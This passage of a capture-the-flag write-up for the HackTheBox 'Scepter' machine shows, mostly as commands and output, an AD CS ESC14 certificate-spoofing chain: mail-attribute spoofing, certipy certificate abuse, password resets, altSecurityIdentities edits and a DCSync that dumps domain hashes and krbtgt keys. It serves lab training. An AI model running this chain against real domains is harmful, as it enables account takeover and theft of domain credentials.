<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">  Template Name                       : StaffAccessCertificate</span><br><span class="line">  Display Name                        : StaffAccessCertificate</span><br><span class="line">  Certificate Authorities             : scepter-DC01-CA</span><br><span class="line">  Enabled                             : True</span><br><span class="line">  Client Authentication               : True</span><br><span class="line">  Enrollment Agent                    : False</span><br><span class="line">  Any Purpose                         : False</span><br><span class="line">  Enrollee Supplies Subject           : False</span><br><span class="line">  Certificate Name Flag               : SubjectRequireEmail</span><br><span class="line">                                        SubjectRequireDnsAsCn</span><br><span class="line">                                        SubjectAltRequireEmail</span><br><span class="line">  Enrollment Flag                     : NoSecurityExtension</span><br><span class="line">                                        AutoEnrollment</span><br><span class="line">  Private Key Flag                    : 16842752</span><br><span class="line">  Extended Key Usage                  : Client Authentication</span><br><span class="line">                                        Server Authentication</span><br><span class="line">  Requires Manager Approval           : False</span><br><span class="line">  Requires Key Archival               : False</span><br><span class="line">  Authorized Signatures Required      : 0</span><br><span class="line">  Validity Period                     : 99 years</span><br><span class="line">  Renewal Period                      : 6 weeks</span><br><span class="line">  Minimum RSA Key Length              : 2048</span><br><span class="line">  Permissions</span><br><span class="line">    Enrollment Permissions</span><br><span class="line">      Enrollment Rights               : SCEPTER.HTB\staff</span><br><span class="line">    Object Control Permissions</span><br><span class="line">      Owner                           : SCEPTER.HTB\Enterprise Admins</span><br><span class="line">      Full Control Principals         : SCEPTER.HTB\Domain Admins</span><br><span class="line">                                        SCEPTER.HTB\Local System</span><br><span class="line">                                        SCEPTER.HTB\Enterprise Admins</span><br><span class="line">      Write Owner Principals          : SCEPTER.HTB\Domain Admins</span><br><span class="line">                                        SCEPTER.HTB\Local System</span><br><span class="line">                                        SCEPTER.HTB\Enterprise Admins</span><br><span class="line">      Write Dacl Principals           : SCEPTER.HTB\Domain Admins</span><br><span class="line">                                        SCEPTER.HTB\Local System</span><br><span class="line">                                        SCEPTER.HTB\Enterprise Admins</span><br><span class="line">      Write Property Principals       : SCEPTER.HTB\Domain Admins</span><br><span class="line">                                        SCEPTER.HTB\Local System</span><br><span class="line">                                        SCEPTER.HTB\Enterprise Admins</span><br></pre></td></tr></table></figure></div>

<p>If we enum certs we will find <code>StaffAccessCertificate</code> cert with <code>SubjectAltRequireEmail</code> and <code>NoSecurityExtension</code>, also the <code>altSecurityIdentities</code> : {X509:<a class="link"   href="mailto:&#x68;&#x2e;&#98;&#x72;&#111;&#x77;&#110;&#64;&#x73;&#x63;&#x65;&#x70;&#116;&#101;&#114;&#46;&#x68;&#116;&#98;" >&#x68;&#x2e;&#98;&#x72;&#111;&#x77;&#110;&#64;&#x73;&#x63;&#x65;&#x70;&#116;&#101;&#114;&#46;&#x68;&#116;&#98; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>} set for the h.brown user which means we can perform the attack mentioned here: <a class="link"   target="_blank" rel="noopener" href="https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#4a82" >https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#4a82 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ ldapsearch -x -H ldap://scepter.htb -D <span class="string">&#x27;a.carter@scepter.htb&#x27;</span> -w <span class="string">&#x27;Password123!&#x27;</span> -b <span class="string">&quot;dc=scepter,dc=htb&quot;</span> <span class="string">&quot;(sAMAccountName=h.brown)&quot;</span> altSecurityIdentities</span><br><span class="line"></span><br><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;dc=scepter,dc=htb&gt; with scope subtree</span></span><br><span class="line"><span class="comment"># filter: (sAMAccountName=h.brown)</span></span><br><span class="line"><span class="comment"># requesting: altSecurityIdentities </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># h.brown, Users, scepter.htb</span></span><br><span class="line">dn: CN=h.brown,CN=Users,DC=scepter,DC=htb</span><br><span class="line">altSecurityIdentities: X509:&lt;RFC822&gt;h.brown@scepter.htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># search reference</span></span><br><span class="line">ref: ldap://ForestDnsZones.scepter.htb/DC=ForestDnsZones,DC=scepter,DC=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># search reference</span></span><br><span class="line">ref: ldap://DomainDnsZones.scepter.htb/DC=DomainDnsZones,DC=scepter,DC=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># search reference</span></span><br><span class="line">ref: ldap://scepter.htb/CN=Configuration,DC=scepter,DC=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"><span class="comment"># numResponses: 5</span></span><br><span class="line"><span class="comment"># numEntries: 1</span></span><br><span class="line"><span class="comment"># numReferences: 3</span></span><br></pre></td></tr></table></figure></div>

<p>Now we will set d.bakerâ€™s mail attribute to match that of the target user (h.brown) for authentication spoofing:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ bloodyAD -d scepter.htb -u a.carter -p Password123! --host dc01.scepter.htb <span class="built_in">set</span> object d.baker mail -v h.brown@scepter.htb</span><br><span class="line">[+] d.baker<span class="string">&#x27;s mail has been updated</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span></span><br><span class="line"><span class="string">â””â”€$ certipy-ad req -username &quot;d.baker@scepter.htb&quot; -hashes 18b5fb0d99e7a475316213c15b6f22ce -target &quot;dc01.scepter.htb&quot; -ca &#x27;</span>scepter-DC01-CA<span class="string">&#x27; -template &#x27;</span>StaffAccessCertificate<span class="string">&#x27; </span></span><br><span class="line"><span class="string">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Requesting certificate via RPC</span></span><br><span class="line"><span class="string">[-] Got error: The NETBIOS connection with the remote host timed out.</span></span><br><span class="line"><span class="string">[-] Use -debug to print a stacktrace</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span></span><br><span class="line"><span class="string">â””â”€$ certipy-ad req -username &quot;d.baker@scepter.htb&quot; -hashes 18b5fb0d99e7a475316213c15b6f22ce -target &quot;dc01.scepter.htb&quot; -ca &#x27;</span>scepter-DC01-CA<span class="string">&#x27; -template &#x27;</span>StaffAccessCertificate<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Requesting certificate via RPC</span></span><br><span class="line"><span class="string">[*] Successfully requested certificate</span></span><br><span class="line"><span class="string">[*] Request ID is 7</span></span><br><span class="line"><span class="string">[*] Got certificate without identification</span></span><br><span class="line"><span class="string">[*] Certificate has no object SID</span></span><br><span class="line"><span class="string">[*] Saved certificate and private key to &#x27;</span>d.baker.pfx<span class="string">&#x27;</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span></span><br><span class="line"><span class="string">â””â”€$ certipy-ad auth -pfx d.baker.pfx -domain scepter.htb -dc-ip 10.10.11.65 -username h.brown </span></span><br><span class="line"><span class="string">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] Could not find identification in the provided certificate</span></span><br><span class="line"><span class="string">[*] Using principal: h.brown@scepter.htb</span></span><br><span class="line"><span class="string">[*] Trying to get TGT...</span></span><br><span class="line"><span class="string">[*] Got TGT</span></span><br><span class="line"><span class="string">[*] Saved credential cache to &#x27;</span>h.brown.ccache<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[*] Trying to retrieve NT hash for &#x27;</span>h.brown<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[*] Got hash for &#x27;</span>h.brown@scepter.htb<span class="string">&#x27;: aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span></span><br><span class="line"><span class="string">â””â”€$ export KRB5CCNAME=h.brown.ccache</span></span><br></pre></td></tr></table></figure></div>

<p>basically we can request a cert on behalf of whatever userâ€™s email is used.</p>
<p>Now checking h.brownâ€™s permissions:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ bloodyAD --host dc01.scepter.htb -d scepter.htb -u h.brown -k get writable --detail</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=scepter,DC=htb</span><br><span class="line">url: WRITE</span><br><span class="line">wWWHomePage: WRITE</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=h.brown,CN=Users,DC=scepter,DC=htb</span><br><span class="line">thumbnailPhoto: WRITE</span><br><span class="line">pager: WRITE</span><br><span class="line">mobile: WRITE</span><br><span class="line">homePhone: WRITE</span><br><span class="line">userSMIMECertificate: WRITE</span><br><span class="line">msDS-ExternalDirectoryObjectId: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute20: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute19: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute18: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute17: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute16: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute15: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute14: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute13: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute12: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute11: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute10: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute9: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute8: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute7: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute6: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute5: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute4: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute3: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute2: WRITE</span><br><span class="line">msDS-cloudExtensionAttribute1: WRITE</span><br><span class="line">msDS-GeoCoordinatesLongitude: WRITE</span><br><span class="line">msDS-GeoCoordinatesLatitude: WRITE</span><br><span class="line">msDS-GeoCoordinatesAltitude: WRITE</span><br><span class="line">msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE</span><br><span class="line">msPKI-CredentialRoamingTokens: WRITE</span><br><span class="line">msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE</span><br><span class="line">msDS-FailedInteractiveLogonCount: WRITE</span><br><span class="line">msDS-LastFailedInteractiveLogonTime: WRITE</span><br><span class="line">msDS-LastSuccessfulInteractiveLogonTime: WRITE</span><br><span class="line">msDS-SupportedEncryptionTypes: WRITE</span><br><span class="line">msPKIAccountCredentials: WRITE</span><br><span class="line">msPKIDPAPIMasterKeys: WRITE</span><br><span class="line">msPKIRoamingTimeStamp: WRITE</span><br><span class="line">mSMQDigests: WRITE</span><br><span class="line">mSMQSignCertificates: WRITE</span><br><span class="line">userSharedFolderOther: WRITE</span><br><span class="line">userSharedFolder: WRITE</span><br><span class="line">url: WRITE</span><br><span class="line">otherIpPhone: WRITE</span><br><span class="line">ipPhone: WRITE</span><br><span class="line">assistant: WRITE</span><br><span class="line">primaryInternationalISDNNumber: WRITE</span><br><span class="line">primaryTelexNumber: WRITE</span><br><span class="line">otherMobile: WRITE</span><br><span class="line">otherFacsimileTelephoneNumber: WRITE</span><br><span class="line">userCert: WRITE</span><br><span class="line">homePostalAddress: WRITE</span><br><span class="line">personalTitle: WRITE</span><br><span class="line">wWWHomePage: WRITE</span><br><span class="line">otherHomePhone: WRITE</span><br><span class="line">streetAddress: WRITE</span><br><span class="line">otherPager: WRITE</span><br><span class="line">info: WRITE</span><br><span class="line">otherTelephone: WRITE</span><br><span class="line">userCertificate: WRITE</span><br><span class="line">preferredDeliveryMethod: WRITE</span><br><span class="line">registeredAddress: WRITE</span><br><span class="line">internationalISDNNumber: WRITE</span><br><span class="line">x121Address: WRITE</span><br><span class="line">facsimileTelephoneNumber: WRITE</span><br><span class="line">teletexTerminalIdentifier: WRITE</span><br><span class="line">telexNumber: WRITE</span><br><span class="line">telephoneNumber: WRITE</span><br><span class="line">physicalDeliveryOfficeName: WRITE</span><br><span class="line">postOfficeBox: WRITE</span><br><span class="line">postalCode: WRITE</span><br><span class="line">postalAddress: WRITE</span><br><span class="line">street: WRITE</span><br><span class="line">st: WRITE</span><br><span class="line">l: WRITE</span><br><span class="line">c: WRITE</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb</span><br><span class="line">altSecurityIdentities: WRITE</span><br></pre></td></tr></table></figure></div>

<p>h.brown can altSecuirtyIdentities of p.adams</p>
<p>We can do that from an evil-winrm shell:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\h.brown\Documents&gt; Set-ADUser -Identity <span class="string">&quot;p.adams&quot;</span> -Add @&#123;<span class="string">&#x27;altSecurityIdentities&#x27;</span>=<span class="string">&#x27;X509:&lt;RFC822&gt;kujen@scepter.htb&#x27;</span>&#125;</span><br><span class="line">*Evil-WinRM* PS C:\Users\h.brown\Documents&gt; Get-ADUser -Identity p.adams -Properties altSecurityIdentities</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">altSecurityIdentities : &#123;X509:&lt;RFC822&gt;kujen@scepter.htb&#125;</span><br><span class="line">DistinguishedName     : CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb</span><br><span class="line">Enabled               : True</span><br><span class="line">GivenName             : p.adams</span><br><span class="line">Name                  : p.adams</span><br><span class="line">ObjectClass           : user</span><br><span class="line">ObjectGUID            : a7ce1414-7b8e-41b7-9725-3686e4ed80a7</span><br><span class="line">SamAccountName        : p.adams</span><br><span class="line">SID                   : S-1-5-21-74879546-916818434-740295365-1109</span><br><span class="line">Surname               :</span><br><span class="line">UserPrincipalName     : p.adams@scepter.htb</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>now again</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ getTGT.py -dc-ip 10.10.11.65 -hashes <span class="string">&#x27;:18b5fb0d99e7a475316213c15b6f22ce&#x27;</span> scepter.htb/d.baker</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> d.baker.ccache</span><br><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ <span class="built_in">export</span> KRB5CCNAME=d.baker.ccache</span><br><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ bloodyAD -d scepter.htb -u d.baker -k --host dc01.scepter.htb --dc-ip 10.10.11.65 <span class="built_in">set</span> password a.carter Password123!</span><br><span class="line">[+] Password changed successfully!</span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ bloodyAD -d scepter.htb -u a.carter -p Password123! --host dc01.scepter.htb --dc-ip 10.10.11.65 add genericAll <span class="string">&quot;OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB&quot;</span> a.carter</span><br><span class="line">[+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB</span><br></pre></td></tr></table></figure></div>

<p>Now set the mail attribute of d.baker to a spoofed value (<a class="link"   href="mailto:&#112;&#97;&#x69;&#x6e;&#x40;&#115;&#99;&#x65;&#112;&#116;&#x65;&#114;&#46;&#104;&#x74;&#x62;" >&#112;&#97;&#x69;&#x6e;&#x40;&#115;&#99;&#x65;&#112;&#116;&#x65;&#114;&#46;&#104;&#x74;&#x62; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) for another impersonation:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p <span class="string">&#x27;Password123!&#x27;</span> <span class="built_in">set</span> object d.baker mail -v kujen@scepter.htb</span><br><span class="line">[+] d.baker<span class="string">&#x27;s mail has been updated</span></span><br></pre></td></tr></table></figure></div>

<p>Now request a new certificate for d.baker with updated mail spoof:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ certipy-ad  req -username d.baker@scepter.htb -hashes 18b5fb0d99e7a475316213c15b6f22ce -ca scepter-DC01-CA -template StaffAccessCertificate</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 11</span><br><span class="line">[*] Got certificate without identification</span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to <span class="string">&#x27;d.baker.pfx&#x27;</span></span><br><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ certipy-ad auth -pfx <span class="string">&#x27;d.baker.pfx&#x27;</span> -domain <span class="string">&#x27;scepter.htb&#x27;</span> -username <span class="string">&#x27;p.adams&#x27;</span> </span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[!] Could not find identification <span class="keyword">in</span> the provided certificate</span><br><span class="line">[*] Using principal: p.adams@scepter.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;p.adams.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;p.adams&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;p.adams@scepter.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0</span><br><span class="line">                                                </span><br></pre></td></tr></table></figure></div>

<p>Now we can see that p.adams is a member of REPLICATION OPERATORS:</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Scepter/blood2.png"
                      alt="BloodHound"
                ><figcaption>BloodHound</figcaption></figure></p>
<p>So we can directly dump credentials with him and get administrator access: (DcSync)</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ secretsdump.py -k DC01.scepter.htb                          </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c030fca580038cc8b1100ee37064a4a9:::</span><br><span class="line">scepter.htb\d.baker:1106:aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce:::</span><br><span class="line">scepter.htb\a.carter:1107:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::</span><br><span class="line">scepter.htb\h.brown:1108:aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c:::</span><br><span class="line">scepter.htb\p.adams:1109:aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0:::</span><br><span class="line">scepter.htb\e.lewis:2101:aad3b435b51404eeaad3b435b51404ee:628bf1914e9efe3ef3a7a6e7136f60f3:::</span><br><span class="line">scepter.htb\o.scott:2102:aad3b435b51404eeaad3b435b51404ee:3a4a844d2175c90f7a48e77fa92fce04:::</span><br><span class="line">scepter.htb\M.clark:2103:aad3b435b51404eeaad3b435b51404ee:8db1c7370a5e33541985b508ffa24ce5:::</span><br><span class="line">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0a4643c21fd6a17229b18ba639ccfd5f:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:cc5d676d45f8287aef2f1abcd65213d9575c86c54c9b1977935983e28348bcd5</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:bb557b22bad08c219ce7425f2fe0b70c</span><br><span class="line">Administrator:des-cbc-md5:f79d45bf688aa238</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:5d62c1b68af2bb009bb4875327edd5e4065ef2bf08e38c4ea0e609406d6279ee</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:b9bc4dc299fe99a4e086bbf2110ad676</span><br><span class="line">krbtgt:des-cbc-md5:57f8ef4f4c7f6245</span><br><span 